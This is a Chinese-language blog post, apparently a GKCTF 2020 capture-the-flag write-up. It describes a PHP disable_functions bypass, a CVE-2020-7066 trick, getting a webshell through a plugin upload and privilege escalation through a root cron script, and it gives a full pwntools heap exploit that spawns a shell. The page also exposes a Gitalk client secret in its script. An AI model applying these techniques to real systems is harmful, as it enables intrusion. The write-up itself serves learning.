@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>GKCTF_2020_Writeup - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="GKCTF_2020_Writeup | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2020/05/26/GKCTF_2020_Writeup//images/WechatIMG1350.jpeg">
+<meta property="twitter:image" content="https://blog.play2win.top/2020/05/26/GKCTF_2020_Writeup//images/WechatIMG1350.jpeg">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="GKCTF_2020_Writeup" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="GKCTF_2020_Writeup" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-image">
+        <span  class="image is-7by1">
+            <img class="thumbnail" src="/images/WechatIMG1350.jpeg" alt="GKCTF_2020_Writeup">
+        </span>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-05-26T15:14:27.000Z">2020-05-26</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    9 分钟 读完 (大约 1333 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                GKCTF_2020_Writeup
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目总体好像不太难，题目质量也可以。web在比赛时候做出3道题，马马虎虎，pwn题肝了很久也没做出来，赛后花了两天才研究透，以至于现在才发writeup，还是菜，不过也通过这题学到了很多。</p>
+<p>比赛那天本来一早有网课，边上课边做题，但是爷爷在我还在上课时候硬拉我去喝早茶-_-!…</p>
+<a id="more"></a>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>打开直接给了源码，小小的一个webshell，估摸着可能能绕waf。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 195802.png" alt></p>
+<p>习惯性的看了下<code>phpinfo</code>，发现ban了可以执行命令的函数。这时候当然是上神器蚁剑，但是各种模式都没法bypass<code>disable_functions</code>。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 200440.png" alt></p>
+<p>其中PHP7的那个模式可能是web目录不可写的原因，所以不成功。直接上传<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass" target="_blank" rel="noopener"><strong>exp</strong></a>到<code>/tmp</code>目录，<code>include</code>一下它就行了。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 201959.png" alt></p>
+<h2 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h2><p>题目给了提示是<code>cve-2020-7066</code>，在<a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener"><strong>官网</strong></a>找到了一个example，估计题目也是差不多的代码。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 202733.png" alt></p>
+<p>依据hint，照着官网的example截断。又出来一个hint要求host要以123结尾，这时我对localhost、127.0.0.1各种<code>@123</code>、<code>:123</code>、<code>/?123</code>……最后发现用127.0.0.123就行……</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 203747.png" alt></p>
+<h2 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h2><p>开局一个开源商城系统，估摸着又要代码审计了。网站最下方的官网提供了github的源码下载链接，又因为最近是特殊时期，源码下载得特别慢，遂去gtihub看下commit，看能不能找到些有用的东西。</p>
+<p>所以给我发现了1.8.0版本之后的commit有个<strong>tp漏洞同步修复 </strong>。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 205510.png" alt></p>
+<p>搜了一下在<a href="https://paper.seebug.org/770/#21-0day" target="_blank" rel="noopener"><strong>seebug</strong></a>的一篇文章里发现是thinkphp5.1.X的REC漏洞，但是用exp怎么打也没成功执行命令。于是等源码装好了，开debug模式看看是怎么回事。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 205639.png" alt></p>
+<p>装好发现默认密码是这个系统的名字，大胆猜测题目的密码也没有改（手动滑稽）</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 211849.png" alt></p>
+<p>就这样轻松的进入了后台，应用中心这个功能很引人注目，似乎来到了挖洞时候的老套路。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 213153.png" alt></p>
+<p>不出所料，每个应用包的controller目录里都有几个php文件，于是乎在后台管理的php文件里插入个一句话，再重新打包上传安装。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 222004.png" alt></p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://06d4e07c-9491-4c5d-86a6-8c98c12b59b1.node3.buuoj.cn/admin.php?s=/plugins/index/pluginsname/goodssales/pluginscontrol/admin/pluginsaction/index.html</span><br></pre></td></tr></table></figure>
+<p>在管理页面那就能getshell，蚁剑连接的时候要带上cookie。在根目录发现了假flag，说真的flag在/root目录里，但现在的用户进不去/root目录，但是根目录看见个shell脚本比较明显，内容为每60秒执行一个python脚本。</p>
+<p>用蚁剑的模拟终端看见这个脚本是以root用户运行的。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 223527.png" alt></p>
+<p>好在那个python脚本可写，顺理成章读flag。</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 223755.png" alt></p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 223923.png" alt></p>
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><p>这题其实很简单，但我在比赛时候粗心大意没做出来-_-!</p>
+<p>IDA直接搜索字符串，发现串奇怪的字符串，看起来不像是base64。当时我去在线的base58解码的时候错把编码当解码，又没仔细看-_-!</p>
+<p><img src="/2020/05/26/GKCTF_2020_Writeup/批注 2020-05-26 225247.png" alt></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p><strong>pwn题就看了一题，题目是真心觉得出得不错</strong></p>
+<h2 id="Domo"><a href="#Domo" class="headerlink" title="Domo"></a>Domo</h2><p>在比赛时没做出来，赛后复现了下。</p>
+<p>先贴一下exp，思路等会再水一文细说。</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="hljs-string">'DEBUG'</span></span><br><span class="line">context.binary = <span class="hljs-string">'./domo'</span></span><br><span class="line">elf = ELF(<span class="hljs-string">'./domo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">'l'</span>:</span><br><span class="line">    p = process(<span class="hljs-string">'./domo'</span>)</span><br><span class="line">    libc = context.binary.libc</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    p = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28773</span>)</span><br><span class="line">    libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_add</span><span class="hljs-params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'size:'</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_del</span><span class="hljs-params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_show</span><span class="hljs-params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'index:\n'</span>,str(index))</span><br><span class="line">    <span class="hljs-keyword">return</span> p.recv(<span class="hljs-number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd_edit</span><span class="hljs-params">(addr,num)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'&gt; '</span>,<span class="hljs-string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'addr:'</span>,str(addr))</span><br><span class="line">    p.sendlineafter(<span class="hljs-string">'num:'</span>,num)</span><br><span class="line"></span><br><span class="line">cmd_add(<span class="hljs-number">0x40</span>,<span class="hljs-string">''</span>) <span class="hljs-comment"># 0</span></span><br><span class="line">cmd_add(<span class="hljs-number">0x60</span>,<span class="hljs-string">''</span>) <span class="hljs-comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># leak main_arena</span></span><br><span class="line">cmd_add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">''</span>) <span class="hljs-comment"># 2</span></span><br><span class="line">cmd_add(<span class="hljs-number">0x10</span>,<span class="hljs-string">''</span>) <span class="hljs-comment"># 3</span></span><br><span class="line">offset = <span class="hljs-number">0x7ffff7bcdb78</span> - <span class="hljs-number">0x7ffff7bcdb0a</span></span><br><span class="line">cmd_del(<span class="hljs-number">2</span>)</span><br><span class="line">cmd_add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">''</span>)</span><br><span class="line">main_arena = u64(cmd_show(<span class="hljs-number">2</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) + offset</span><br><span class="line">offset = <span class="hljs-number">0x7f3d7a680b78</span> - <span class="hljs-number">0x7f3d7a2bc000</span></span><br><span class="line">libc.address = main_arena - offset</span><br><span class="line">print(hex(main_arena))</span><br><span class="line">print(hex(libc.address))</span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># leak heap_addr</span></span><br><span class="line">cmd_add(<span class="hljs-number">0x10</span>,<span class="hljs-string">''</span>) <span class="hljs-comment"># 4</span></span><br><span class="line">cmd_del(<span class="hljs-number">3</span>)</span><br><span class="line">cmd_del(<span class="hljs-number">4</span>)</span><br><span class="line">cmd_add(<span class="hljs-number">0x10</span>,<span class="hljs-string">''</span>)</span><br><span class="line">heap_addr = u64(cmd_show(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x10a</span> + <span class="hljs-number">0x10</span></span><br><span class="line">print(hex(heap_addr))</span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># overlapping</span></span><br><span class="line">cmd_del(<span class="hljs-number">0</span>)</span><br><span class="line">cmd_add(<span class="hljs-number">0x40</span>,flat(<span class="hljs-number">0</span>,<span class="hljs-number">0xb1</span>,heap_addr+<span class="hljs-number">0x18</span>,heap_addr+<span class="hljs-number">0x20</span>,heap_addr+<span class="hljs-number">0x10</span>))</span><br><span class="line">cmd_del(<span class="hljs-number">1</span>)</span><br><span class="line">cmd_add(<span class="hljs-number">0x68</span>,flat(<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x60</span>,<span class="hljs-number">0xb0</span>))</span><br><span class="line">cmd_del(<span class="hljs-number">2</span>)</span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># fastbins attack overwrite vtable</span></span><br><span class="line"><span class="hljs-comment"># _IO_file_jumps = libc.sym['_IO_file_jumps']</span></span><br><span class="line">_IO_2_1_stdin_ = libc.sym[<span class="hljs-string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">fake_chunk = _IO_2_1_stdin_ + <span class="hljs-number">160</span> - <span class="hljs-number">0x3</span></span><br><span class="line">fake_vtable = heap_addr + <span class="hljs-number">0x210</span></span><br><span class="line">one_gadgets = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="hljs-number">2</span>]</span><br><span class="line">print(hex(_IO_file_jumps))</span><br><span class="line">print(hex(_IO_2_1_stdin_))</span><br><span class="line">print(hex(fake_vtable))</span><br><span class="line">print(hex(one_gadget))</span><br><span class="line">cmd_add(<span class="hljs-number">0xc0</span>,<span class="hljs-string">''</span>)</span><br><span class="line">cmd_add(<span class="hljs-number">0x60</span>,<span class="hljs-string">''</span>)</span><br><span class="line">cmd_del(<span class="hljs-number">4</span>)</span><br><span class="line">cmd_del(<span class="hljs-number">1</span>)</span><br><span class="line">cmd_del(<span class="hljs-number">2</span>)</span><br><span class="line">cmd_add(<span class="hljs-number">0xc0</span>,flat(<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x38</span>,<span class="hljs-number">0x71</span>,fake_chunk))</span><br><span class="line">cmd_add(<span class="hljs-number">0xa8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(one_gadget)*<span class="hljs-number">19</span>)</span><br><span class="line">payload = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">3</span>+flat(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xffffffff</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,fake_vtable,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)</span><br><span class="line">cmd_add(<span class="hljs-number">0x60</span>,<span class="hljs-string">''</span>)</span><br><span class="line"><span class="hljs-comment"># gdb.attach(p)</span></span><br><span class="line">cmd_add(<span class="hljs-number">0x63</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener"><strong>get_headers() silently truncates after a null byte</strong></a></p>
+<p><a href="https://paper.seebug.org/770/#21-0day" target="_blank" rel="noopener"><strong>Thinkphp5 远程代码执行漏洞事件分析报告</strong></a></p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2020/05/26/GKCTF_2020_Writeup/">GKCTF_2020_Writeup</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2020/05/26/GKCTF_2020_Writeup/">https://blog.play2win.top/2020/05/26/GKCTF_2020_Writeup/</a></li>
+            <li><strong>发布时间：</strong>2020-05-26</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2020/05/27/GKCTF 2020 Domo分析/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">[PWN]GKCTF 2020 Domo分析</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/03/25/BJDCTF_writeup/">
+                <span class="level-item">BJDCTF_writeup</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: 'f3f99940e4f0e710b8a18ce46139c83c',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><ul class="menu-list"><li>
+        <a class="is-flex" href="#前言">
+        <span class="has-mr-6">1.1</span>
+        <span>前言</span>
+        </a></li></ul><li>
+        <a class="is-flex" href="#WEB">
+        <span class="has-mr-6">2</span>
+        <span>WEB</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#CheckIN">
+        <span class="has-mr-6">2.1</span>
+        <span>CheckIN</span>
+        </a></li><li>
+        <a class="is-flex" href="#cve版签到">
+        <span class="has-mr-6">2.2</span>
+        <span>cve版签到</span>
+        </a></li><li>
+        <a class="is-flex" href="#老八小超市儿">
+        <span class="has-mr-6">2.3</span>
+        <span>老八小超市儿</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#REVERSE">
+        <span class="has-mr-6">3</span>
+        <span>REVERSE</span>
+        </a></li><li>
+        <a class="is-flex" href="#PWN">
+        <span class="has-mr-6">4</span>
+        <span>PWN</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#Domo">
+        <span class="has-mr-6">4.1</span>
+        <span>Domo</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">5</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
